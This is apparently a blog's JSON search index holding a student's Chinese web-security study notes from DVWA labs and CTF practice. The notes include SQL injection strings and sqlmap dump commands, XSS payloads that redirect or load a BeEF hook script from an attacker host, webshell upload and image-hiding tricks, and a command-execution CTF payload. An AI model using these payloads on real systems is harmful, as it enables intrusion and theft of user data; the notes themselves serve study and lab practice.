{"meta":{"title":"無与倫比","subtitle":"菜鸟成长记","description":"静者心多妙，飘然思不群","author":"alun","url":"http://example.com","root":"/"},"pages":[{"title":"心之所向","date":"2022-10-02T02:26:50.000Z","updated":"2022-10-02T02:30:23.350Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"万众瞩目","date":"2022-10-02T02:27:06.000Z","updated":"2022-10-02T02:34:53.487Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"网安篇（5）","slug":"网安篇（5）","date":"2022-10-30T04:22:05.796Z","updated":"2022-10-31T13:10:25.493Z","comments":true,"path":"2022/10/30/网安篇（5）/","link":"","permalink":"http://example.com/2022/10/30/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%885%EF%BC%89/","excerpt":"一、学习内容1.1dirsearch下载及使用 GitHub的下载地址为：https://github.com/maurosoria/dirsearch","text":"一、学习内容1.1dirsearch下载及使用 GitHub的下载地址为：https://github.com/maurosoria/dirsearch 1.1.1命令使用python.exe dirsearch.py -h可以查看到各种命令。 常用：dirsearch.py -u ip地址 -e ​ -u 指定url -e 指定网站语言 -w 可以加上自己的字典（带上路径） 例如: 1.2修改请求头为本地访问X-Forward-For：127.0.0.1 Referer：127.0.0.1 1.3xss漏洞在登录界面随便输入一个账号密码，看一下返回的信息若得到错误的信息，发现url里面有get类型的错误参数，如果没有过滤的话我们将文字替换为可以得到xss漏洞，没有过滤，拿下xss。 1.4端口号对应服务HTTP 80 ​ HTTPS 443 ​ Telnet 23 ​ FTP 221 ​ SSH（远程登录）SCP（文件传输），端口重定向 22 ​ SMTP 25 ​ POP3 110 ​ WebLogic 7001 ​ TOMCAT 8080 ​ WIN2003远程登录 3389 ​ Oracle数据库 1521 ​ MS SQL*SEVER数据库sever 1433 ​ MySQL数据库sever 3306 2.1掌握php弱类型比较2.1.1php中其中两种比较符号:==：先将字符串类型转化成相同，再比较===：先判断两种字符串的类型是否相等，再比较字符串和数字比较使用==时,字符串会先转换为数字类型再比较var_dump(‘a’ == 0);//true，此时a字符串类型转化成数字，因为a字符串开头中没有找到数字，所以转换为0。var_dump(‘123a’ == 123);//true，这里’123a’会被转换为123。 var_dump(‘a123’ == 123);//false，因为php中有这样一个规定：字符串的开始部分决定了它的值，如果该字符串以合法的数字开始，则使用该数字至和它连续的最后一个数字结束，否则其比较时整体值为0。举例：var_dump(‘123a1’ == 123);//truevar_dump(‘1233a’ == 123);//false&lt;、&gt;、&lt;=、&gt;=都存在和==相同的弱类型 123456789101112131415&lt;?phpshow_source(__FILE__);include(&quot;config.php&quot;);$a=@$_GET[&#x27;a&#x27;];$b=@$_GET[&#x27;b&#x27;];if($a==0 and $a)&#123; echo $flag1;&#125;if(is_numeric($b))&#123; exit();&#125;if($b&gt;1234)&#123; echo $flag2;&#125;?&gt; (1)这里包含了config.php(2)url接收参数a和b的值(3)如果$a等于0 and flag1(4)如果b&gt;1234，输出$flag2 if(true and true){ //这里$a==0 and $a，==为弱类型比较，字符串开头都为0，所以0==0 and ‘b’，因为字符串b存在，所以and后面也为true，所以双true，最后if括号里为true，执行if下面的语句 1234567echo $flag1;&#125;if(is_numeric(2222a))&#123;exit();&#125;if(2222a&gt;1234)&#123;echo $flag2; 3.1sql手工注入3.1.1万能密码12345678admin&#x27; --admin&#x27; #admin&#x27;/*&#x27; or 1=1--&#x27; or 1=1#&#x27; or 1=1/*&#x27;) or &#x27;1&#x27;=&#x27;1--&#x27;) or (&#x27;1&#x27;=&#x27;1-- 3.1.2mysql常见名称schema_name 储存了所有数据库的库名tables 储存了数据库库名，以及该库中包含的表名table_schema 储存了数据库名table_name 储存了表名 3.1.3手工注入命令爆表1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#爆列1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ and table_schema=’dvwa’# 3.1.4有回显的手工SQL注入步骤mysql的注释可以是#或者– ，注意–后面有空格，可以写成– ss这样比较不容易漏掉空格。此外如果在url中用#要进行url编码，写为%23。 1、找注入点 2、找闭合，常见的有单引号、双引号（字符型），无闭合（数值型） 确定 3、确定列数 order by 4、确定字段类型 union select 5、爆库 union select 1,database() 爆表 123union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761 （0x64767761是dvwa的ascii码） 爆列 12union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;dvwa&#x27;union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 and table_schema=0x64767761 爆内容 1union select group_concat(user),group_concat(password) from users 3.2sqlmap注入1、如果是post型，可以先burpsuite抓包保存为txt 2、找注入点（可以省略） python sqlmap.py -u “http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” （GET型，如果需要认证身份要加cookie） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\medium.txt” （POST型） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\high.txt” –second-url “http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot; （POST型，输入和回显不在同一个页面) 3、爆库 python sqlmap.py -u “http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” -dbs （GET型，全部可访问的数据库） python sqlmap.py -u “http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” –current-db （GET型，当前数据库） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\medium.txt” –current-db （POST型，当前数据库） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\high.txt” –second-url “http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot; –current-db （POST型，输入和回显不在同一个页面，当前数据库） 4、爆表 python sqlmap.py -u “http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” –tables -D dvwa （GET型） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\medium.txt” –tables -D dvwa （POST型） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\high.txt” –second-url “http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot; –tables -D dvwa （POST型，输入和回显不在同一个页面) 5、爆列 python sqlmap.py -u “http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” –columns -D dvwa -T users （GET型） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\medium.txt” –columns -D dvwa -T users （POST型） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\high.txt” –second-url “http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot; –columns -D dvwa -T users （POST型，输入和回显不在同一个页面) 6、爆内容 python sqlmap.py -u “http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” –dump -D dvwa -T users -C “user,password” （GET型） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\medium.txt” –dump -D dvwa -T users -C “user,password” （POST型） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\high.txt” –second-url “http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot; –dump -D dvwa -T users -C “user,password” （POST型，输入和回显不在同一个页面) 3.3SQL注入防御SQL注入形成的原因是数据和代码没分离，用户可控的数据可以作为SQL语句执行。 因此防御sql注入最有效的方法是使用预编译语句，就像IMPOSSIBLE关这样。 预编译之后输入的参数不会再进行SQL编译，SQL语句的语义不会发生变化。 除此之外，也可以采用安全的存储过程，但存储过程本身可能存在注入；检查输入的数据类型也是有用的，但不是万能的；使用安全函数，注意数据库的最小权限原则也是有利的。 4.1php正则匹配元字符： \\d 匹配任意一个0-9的数字 \\D 匹配任意一个除十进制数以外的字符，等价于[^0-9] \\s 匹配任意一个空白的字符，比如换页符、换行符、回车符号、制表符、垂直制表符 \\S 匹配出空白字符以外的所有字符 \\w 匹配任意一个数字或字母或下划线 \\W 匹配除数字、字母、下划线以外的任意字符 . 匹配除换行符以外的任意一个字符 * 匹配0次，或1次、或多次其前面字符 + 匹配1次或多次其前面的字符 ？ 匹配0次或1次前面的字符 {n} 表示其前面字符恰好出现n次 {n,} 表示其前面字符出现不少于n次 {n,m} 表示其前面的字符至少出现n次，最多出现m次 ^或\\A 匹配字符串开始的位置 $或者\\Z 匹配字符串的结束位置 | 匹配两个或多个模式 [] 匹配方括号中的任意一个字符 [^] 匹配除方括号中字符以外的任意一个字符 () 将括号中作为一个整体以便将其中的内容获取到 4.1.1php正则表达式[\\w]+,\\w+,[\\w+]的区别？[\\w]+和\\w+没有区别，都是匹配数字和字母下划线的多个字符； [\\w+]表示匹配数字、字母、下划线和加号本身字符； 4.1.2例[]：表示数组而非排列，即不按固定次序位置排列；在[]内的字符可以任意次序出现。 [ABC]+：可以匹配”AAABBBCCC,BBBAAACCC,BACCBACAACBAC,…”，不是一定按固定A….B….C…的次序排列。 [\\w./-+]+：是匹配\\w [0-9a-zA-Z_] 或 . 或 / 或 - 或 + 字符； 在[./-+]内均表示字符本身； 在[]+外表示{1,}至少1次或多次； 在[.]内点，不是任意字符的意思，就是匹配点.字符本身，点.可以不需要加反斜杠.。 在[]内特殊字符，表示匹配特殊字符本身，不需要加反斜杠， 在[]外特殊字符，表示匹配特殊字符本身，必须要加反斜杠。 \\W 元字符用于查找非单词字符。 单词字符包括：a-z、A-Z、0-9，以及下划线。 故[^\\W]可以匹配所有单词字符 ^：非的意思 /^$/：正则匹配的开头结尾 4.1.3正则表达式“\\d+||(\\d+\\.\\d+”是什么意思？\\d 是匹配一个数字(0到9) \\d 前面多了第一个\\ 是为了在程序中转义第二个\\，这个你可以忽略 +表示 1个或多个组合起来 \\d+ 就表示多个数字，形如 12、44、6763…… . 匹配一个小数点 \\d+.\\d+ 就表示小数，形如12.334、0.12、87.343…… | 表示或者，一个竖线就够了 () 括号在这里表示分组，实际不匹配任何字符，此处不要括号也可以 \\d+||(\\d+.\\d+) 多个连续的数字或者 多个连续的数+小数点+多个连续的数翻译下就是 非负整数或者非负小数 4.23.binwalk使用binwalk +文件路径 //分析文件中隐藏的其他文件。dd if=图片名 of=ZIP压缩包的名称（自己命名） skip=偏移量 bs=1 5.1php定界符​ 短标签 &lt;% %&gt; ​ var_dump()查看变量类型 ​ 定界符 123456&lt;?php $a=&lt;&lt;&lt;EOT XXXXXXX EOT; echo $a; ?&gt; 5.2正则表达式(二）模式分隔符后的”i”标记这是一个大小写不敏感的搜索 模式中的 \\b 标记一个单词边界，所以只有独立的单词”web”会被匹配，而不会匹配 PHP提供4个专门的执行外部命令的函数：exec(), system(), passthru(), shell_exec() 除了拼接函数外，我们还可以使用命令连接符来组合这些系统函数增加命令执行成功率。常见的命令连接符有（“|，&amp;&amp;，||”这三个连接符都是Windows系统与Linux系统共有的，而“&amp;”是Windows系统特有，“；”是Linux系统特有的）： |：管道操作符 A|B:无论执行的A命令是否正确，B命令都执行 &amp;&amp;：逻辑与 A&amp;&amp;B：只有在A命令成功执行的前提下，B命令才可以执行 ||：逻辑或 A||B：只有在A命令没有执行失败的前提下，B命令才可以执行 &amp; A&amp;B:不管A是否执行成功，B命令都会执行 A&amp;B:不管A是否执行成功，B命令都会执行 5.3字符串经过md5加密 这里是0e开头的，在进行等于比较的时候，PHP 把它当作科学计数法，0 的无论多少次方都是零。 5.4各类文件的16进制开头结尾jpg 文件头: FF D8 文件尾： FF D9JPEG 文件头：FF D8 FF 文件尾：FF D9PNG 文件头：89 50 4E 47 文件尾：AE 42 60 82GIF（gif ）文件头：47 49 46 38 文件尾：00 3BZIP Archive（zip）文件头：50 4B 03 04 文件尾：50 4BTIFF（tif）文件头：49 49 2A 00 文件尾：未知Windows Bitmap（bmp）文件头：42 4D 文件尾：未知CAD（dwg）文件头：41 43 31 30 文件尾：未知XML（xml）文件头：3C 3F 78 6D 6C 文件尾：未知HTML（html）文件头：68 74 6D 6C 3Egif图像开始标志：47 49 46 38 39 61 结束标志：01 01 00 3B 5.5局域网主机发现使用netdiscover 探测局域网内的主机，目的是发现需要渗透的主机 指定IP段 例如：10.10.10.0 netdiscover -r 10.10.10.0/24 选择监听的网卡：比如eth0 netdiscover -i eth0 主动发现：-i指定所要侦听的网卡，-r指定ip段。 netdiscover -i eth0 -r 10.10.10.0/24 6.1vim 交换文件名在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容 以 index.php 为例： 第一次产生的交换文件名为 .index.php.swp 再次意外退出后，将会产生名为 .index.php.swo 的交换文件 第三次产生的交换文件则为 .index.php.swn 二、学习总结这些是近十天的学习总结，学的不算很多，但很杂乱，近期恶补了一些php代码并且参加了一些ctf比赛，虽然往往一场ctf比赛只能写出一道甚至一道都写不出，但总的来说，应该算是有了一定的基础。 算算时间，学习网安也有大半年了，但有效时间也只有不到两个月，在这有效学习时间内，我学习了以下内容。 1.burpsuite抓包爆破 2.top10漏洞（除CSRF） 3.工具的利用 4.近期看着博客步骤对breach1.0进行一次完整的渗透 5.PHP语言 6.MySQL数据库 7.认识HTML，css，js 8.linux基础 9.SQL基础 10.web渗透之信息收集 三、感悟今天是2022年10月30日，距离第一次接触网安已有一年有余，那时意气风发，抱有对黑客技术的热爱与热情加入了信息安全实验室，但在实验室，我迷茫了，对所学知识的模糊认识产生了自我否定——我是不是不适合网安，我是不是比较笨拙？带着疑惑我不知所措，导致在寒假期间彻底摆烂，也因此主动退出实验室。 至2022年4月13日，胡老师想找几个对网安有兴趣的学生学习网安知识，我心中的火又燃了起来，我知道这是一个机会，证明我可以学好网安的唯一机会，我又开始学习网安。这次学的不再是逆向工程，而是web安全！ 由于当时已到学期中旬，专业课繁多，学习时间较少，也快到期末，所以网安学习计划又搁置了，到了暑假事务繁多，有效学习时间也只有不到半个月，对此我深深惭愧。 寒暑假逆袭的关键，而我却没有加以利用，认真去学习！ 接着开学封校，一直到九月中旬才能来校学习，这次，我不会再浪费时间，我一直以来的黑客梦永远不会消散。 虽然道路艰难，但我会一直前行，漫漫长征路，偏向虎山行，此志共勉！","categories":[{"name":"——网络安全","slug":"——网络安全","permalink":"http://example.com/categories/%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"——web","slug":"——web","permalink":"http://example.com/tags/%E2%80%94%E2%80%94web/"}]},{"title":"网安篇（4）","slug":"网安篇（4）","date":"2022-10-03T02:43:31.000Z","updated":"2022-10-03T08:39:34.593Z","comments":true,"path":"2022/10/03/网安篇（4）/","link":"","permalink":"http://example.com/2022/10/03/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%884%EF%BC%89/","excerpt":"正则表达式模式分隔符后的”i”标记这是一个大小写不敏感的搜索模式中的 \\b 标记一个单词边界，所以只有独立的单词”web”会被匹配，而不会匹配","text":"正则表达式模式分隔符后的”i”标记这是一个大小写不敏感的搜索模式中的 \\b 标记一个单词边界，所以只有独立的单词”web”会被匹配，而不会匹配 PHP提供4个专门的执行外部命令的函数：exec(), system(), passthru(), shell_exec() 除了拼接函数外，我们还可以使用命令连接符来组合这些系统函数增加命令执行成功率。常见的命令连接符有（“|，&amp;&amp;，||”这三个连接符都是Windows系统与Linux系统共有的，而“&amp;”是Windows系统特有，“；”是Linux系统特有的）： 管道操作符A|B:无论执行的A命令是否正确，B命令都执行 &amp;&amp;逻辑与 A&amp;&amp;B：只有在A命令成功执行的前提下，B命令才可以执行 ||逻辑或 A||B：只有在A命令没有执行失败的前提下，B命令才可以执行 &amp;A&amp;B:不管A是否执行成功，B命令都会执行 ;A&amp;B:不管A是否执行成功，B命令都会执行 命令执行漏洞 ctfshow291234567891011121314151617181920212223&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:26:48# @email: h1xa@ctfer.com# @link: https://ctfer.com*/ error_reporting(0); //不输出错误if(isset($_GET[&#x27;c&#x27;]))&#123; //接受参数 $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123;//没有匹配到flag就输出eval（&amp;c）意味着过滤了flag字符串 eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 知识点： 1.linux通配符绕过：匹配任意字符串/文本，包括空字符串。如 ls list -&gt; ls l. ?匹配任意一个字符（不在括号内时） 2.[abcd]正则 表示匹配[ ] 里的任何一个字符abcd 3.[a-z] 匹配a-z的任意字符 4.拼接字符串cat file.txt == ca’t’ f’i’le.txt 5.换行符绕过：cat file.txt = cat f\\ile.txt 最终palyload: ?c=system(‘cat f*’);","categories":[{"name":"——网络安全","slug":"——网络安全","permalink":"http://example.com/categories/%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"——web","slug":"——web","permalink":"http://example.com/tags/%E2%80%94%E2%80%94web/"}]},{"title":"网安篇（3）","slug":"网安篇（3）","date":"2022-10-02T02:43:31.000Z","updated":"2022-10-02T02:57:38.236Z","comments":true,"path":"2022/10/02/网安篇（3）/","link":"","permalink":"http://example.com/2022/10/02/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%883%EF%BC%89/","excerpt":"思考总结xss主要分类：反射型xss攻击（Reflected XSS） ：又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。存储型XSS（Stored XSS) ：又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据 库，当一个页面被用户打开的时候执行。每当用户打开浏览器，脚本执行。持久的XSS相比非持久性XSS攻击危害性更大, 因为每当用户打开页面，查看内容时脚本将自动执行。","text":"思考总结xss主要分类：反射型xss攻击（Reflected XSS） ：又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。存储型XSS（Stored XSS) ：又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据 库，当一个页面被用户打开的时候执行。每当用户打开浏览器，脚本执行。持久的XSS相比非持久性XSS攻击危害性更大, 因为每当用户打开页面，查看内容时脚本将自动执行。 xss弹框弹框警告此脚本实现弹框提示，一般作为漏洞测试或者演示使用,类似SQL注入漏洞测试中的单引号’, 一旦此脚本能执行，也就意 味着后端服务器没有对特殊字符做过滤&lt;&gt;/‘ 这样就可以证明，这个页面位置存在了XSS漏洞。 php+HTML &lt;scri.pt&gt;ale.rt(‘xss’) 弹框警告并重定向al.ert(\"请移步到我们的新站\");location.href=\"http://www.qfedu.com\" ale.rt('xss');location.href=\"http://10.1.64.35/mutillidae/robots.txt\" 12&lt;script&gt;al.ert(&quot;请移步到我们的新站&quot;);location.href=&quot;http://www.qfedu.com&quot;&lt;/script&gt; &lt;script&gt;al.ert(&#x27;xss&#x27;);location.href=&quot;http://10.1.64.35/mutillidae/robots.txt&quot;&lt;/script&gt; 这里结合了一些社工的思路，例如，通过网站内部私信的方式将其发给其他用户。如果其他用户点击并且相信了这个信 息，则可能在另外的站点重新登录账户（克隆网站收集账户） 访问恶意代码&lt;scri.pt src=”http://www.qfedu.com/xss.js&quot;&gt;&lt;scri.pt src=”http://BeEF_IP:3000/hook.js&quot;&gt;","categories":[{"name":"——网络安全","slug":"——网络安全","permalink":"http://example.com/categories/%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"——web","slug":"——web","permalink":"http://example.com/tags/%E2%80%94%E2%80%94web/"}]},{"title":"网安篇（2）","slug":"网安篇（2）","date":"2022-10-02T02:40:52.000Z","updated":"2022-10-02T02:57:19.099Z","comments":true,"path":"2022/10/02/网安篇（2）/","link":"","permalink":"http://example.com/2022/10/02/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%882%EF%BC%89/","excerpt":"思考总结1.从kali上的burpsuite上想要抓取物理机上的数据包，必须设置kali的网络连接为NAT模式，并且设置网段与物理机在同一个网段，在burpsuite上设置的代理与本机代理一致。2.REQUEST是在网页端输入变量访问，POST则是在使用像中国蚁剑之类的工具连接。3.MIME类型：一种文件拓展名包含一种MIME类型。","text":"思考总结1.从kali上的burpsuite上想要抓取物理机上的数据包，必须设置kali的网络连接为NAT模式，并且设置网段与物理机在同一个网段，在burpsuite上设置的代理与本机代理一致。2.REQUEST是在网页端输入变量访问，POST则是在使用像中国蚁剑之类的工具连接。3.MIME类型：一种文件拓展名包含一种MIME类型。 文件上传漏洞第一：文件上传漏洞采用上传漏洞顾名思义，就是攻击者上传了一个可执行文件如木马，病毒，恶意脚本，WebShell等到服务器执行，并最终获得网站控制权限的高危漏洞。以下三条一句话木马1.此类为POST类型一句话木马，需蚁剑连接。2.此类为REQUEST类型一句话木马，只能在url地址栏更改内容达到网站控制。（如xxxx/xxx.php?php=phpinfo(),这里等号后面的只能填php语言有效）3.此类为REQUEST类型一句话木马，只能在url地址栏更改内容达到网站控制。（如xxxx/xxx.php?linux=cat /etc/psaawd,这里等号后面的只能填linux命令有效）目前DVWA上的文件上传漏洞分为三个级别，分别为“low、medium、high”low级别将一句话木马用php文件打包好之后，上传到可以上传图片的地方（这里的上传点有较大的漏洞，安全级别为low，并未限制上传的文件格式），如果上传成功，我们可用菜刀或蚁剑之类的工具连接url地址，就可以获取网站控制权限。medium级别此时，安全性高了一个等级，文件上传有了文件类型的限制（如 if( ( $uploaded_type == “image/jpeg” || $uploaded_type == “image/png” ) &amp;&amp;），这样我们只有修改文件类型即可成功上传。用burpsuite抓包修改Content-Type请求头里的内容即可，将MIME类型改为image/jpeg，再forward就能成功上传文件 文件包含漏洞LFI本地文件包含 Local File Include (LFI)所包含文件内容符合PHP语法规范，任何扩展名都可以被PHP解析。所包含文件内容不符合PHP语法规范，会暴露其源代码（相当于文件读取）。RFI远程文件包含 Remote File Include (RFI)如果要使用远程包含功能，首先需要确定PHP是否已经开启远程包含功能选项（php默认关闭远程包含功能：allow_url_include=off），开启远程包含功能需要在php.ini配置文件中修改。远程包含与本地包含没有区别，无非是支持远程加载，更容易getshell，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。 文件包含漏洞也可以和文件上传漏洞相配合使用。通过jpg文件和php文件的结合，将一句话木马隐藏在图片内。 将jpg文件和php文件放在一个目录内，在这个目录cmd模式下输入 copy /b xxx.jpg + xxxx.php xxxxx.jpg 就可生成xxxxx.jpg文件。这段代码意思是生成shell.php这个新文件，并将');?>写入。最后将jpg文件上传，用蚁剑连接shell.php这个文件拿到权限。这就叫条件竞争绕过 竞争条件：服务端首先是允许用户上传任意类型的文件，上传过后再去检查文件，如果文件存在恶意的内容，那么就会执行删除操作，可以利用这个时间差来完成攻击。","categories":[{"name":"——网络安全","slug":"——网络安全","permalink":"http://example.com/categories/%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"——web","slug":"——web","permalink":"http://example.com/tags/%E2%80%94%E2%80%94web/"}]},{"title":"网安篇（1）","slug":"网安篇（1）","date":"2022-10-01T09:20:48.000Z","updated":"2022-10-02T02:45:47.957Z","comments":true,"path":"2022/10/01/网安篇（1）/","link":"","permalink":"http://example.com/2022/10/01/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%881%EF%BC%89/","excerpt":"域名：顶级域名，又称一级域名，常见的有”.com”、”.org”、”.net”、”.cn”等http://baidu.com 一级域名二级域名bbs.baidu .com 二级域名tieba.baidu .com 二级域名多级域名：..__.com","text":"域名：顶级域名，又称一级域名，常见的有”.com”、”.org”、”.net”、”.cn”等http://baidu.com 一级域名二级域名bbs.baidu .com 二级域名tieba.baidu .com 二级域名多级域名：..__.com 顶级域名：com 商业机构edu 教育及研究机构firm 公司企业gov 政府机构info 信息服务net 网络服务机构nom 个人org 专业团体rec 娱乐类机构store 销售类公司企业web 从事WWW活动的机构 DNS是什么：DNS是域名系统,Domain Name System的缩写,服务域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。DNS就是把域名解析为IP地址，提供我们上网，我们能够上网最终是找到IP地址。比如，http://xxxx.com是域名，那么他的IP地址假设是144.144.144.144，我们用浏览器访问该的网页，先到DNS服务器找http://xxxx.com对应的IP地址，然后通过IP地址进行访问。域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。DNS服务器地址:域名解释服务器,打比方,当你在地址栏输入 www.dns.com 时,电脑不是直接就连接到百度的服务器里的,而是先向这个DNS服务器查询www.dns.com的IP地址,然后再按照这个IP地址转到百度的服务器里.一般都是每个地区有一个特定的DNS服务器的,由ISP提供的.由于ISP的拨号服务器一般都有缺省的DNS，所以你可以不用设置DNS，如果你需要指定一台DNS，你一定要了解这台DNS的准确IP（比如福州的163用户的DNS为202.101.98.55）。DNS设置方法如下：在“控制面板”下打开“网络”里的“TCP/IP”的“属性”，在“DNS设置”栏目选择“启用DNS”，并将DNS的IP地址添加即可。IP192.168.X.X一般都是带有路由的IP，网关默认最后1位肯定是1，子网掩码 255.255.255.0简单说C类的IP，子网都可以这样设置我的理解：DNS服务器地址就是将人们可以理解的域名解析成计算机可以获取的二进制语言（也就是这个域名实际所代表的IP地址） 什么是CDN：cdn全称是内容分发网络。其目的是让用户能够更快速的得到请求的数据。简单来讲，cdn就是用来加速的，他能让用户就近访问数据，这样就更更快的获取到需要的数据。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个cdn服务器，上面缓存住一些数据，深圳用户访问时先访问这个cdn服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了CDN与DNS的关系：dns与cdn的关系刚才说到cdn实际上是一个就近访问，那么现在有一个问题是，我们怎么知道用户的所在位置从而给他分配最佳的cdn节点呢。这就需要dns服务来进行定位了。当我们通过使用dns服务的时候，可以根据他使用的LDNS服务器来进行一个定位，例如我们的调度服务器看到他是来自深圳电信的LDNS服务器，那么我们就认为该用户来自深圳电信，然后调度服务器可以让该用户去访问深圳电信的CDN服务器，这样就让用户访问到了最优的cdn节点。通过dns服务我们可以很快的定位到用户的位置，然后给用户分配最佳cdn节点，但是这种调度方式存在一个问题，例如，当我 是北京联通的用户但是使用的却是深圳电信的ldns的话，调度服务器会给我分配到深圳电信的cdn服务器，这样就产生了错误的调度。 网站程序产生漏洞：SQL注入，文件上传，xss，代码执行，变量覆盖，逻辑漏洞，反序列化。","categories":[{"name":"——网络安全","slug":"——网络安全","permalink":"http://example.com/categories/%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"——web","slug":"——web","permalink":"http://example.com/tags/%E2%80%94%E2%80%94web/"}]}],"categories":[{"name":"——网络安全","slug":"——网络安全","permalink":"http://example.com/categories/%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"——web","slug":"——web","permalink":"http://example.com/tags/%E2%80%94%E2%80%94web/"}]}